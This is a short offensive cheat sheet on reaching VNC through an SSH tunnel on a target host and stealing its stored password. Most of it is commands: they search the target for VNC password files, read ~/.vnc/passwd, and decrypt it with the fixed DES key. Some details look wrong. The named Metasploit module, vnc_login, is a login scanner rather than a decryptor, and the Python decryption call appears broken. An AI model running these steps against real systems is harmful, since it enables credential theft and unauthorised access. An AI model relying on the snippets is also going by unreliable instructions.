# VNC over SSH Tunnel

VNC typically listens only on localhost — forward it via SSH to access it locally.

**Forward remote VNC (port 5901) to local port 5901:**
```bash
ssh -L 5901:127.0.0.1:5901 <user>@<TARGET> -N &
vncviewer 127.0.0.1:5901
# or
vncviewer 127.0.0.1:1   # display :1 = port 5901
```

**Display number → port:** display `:N` = port `5900+N`

**Common VNC ports:**
```
5900  # display :0
5901  # display :1
5902  # display :2
```

**Finding VNC secret file** (password stored locally on target):
```bash
find / -name ".vnc" -o -name "passwd" 2>/dev/null | grep vnc
cat ~/.vnc/passwd   # 8-byte DES-encrypted
```

**Decrypt VNC password** (fixed DES key):
```bash
# msfconsole:
use auxiliary/scanner/vnc/vnc_login
# or offline:
python3 -c "
import des, base64
key = b'\x17\x52\x6b\x06\x23\x4e\x58\x07'
enc = open('/path/to/passwd','rb').read()
print(des.desencrypt(enc, key).decode())
"
```
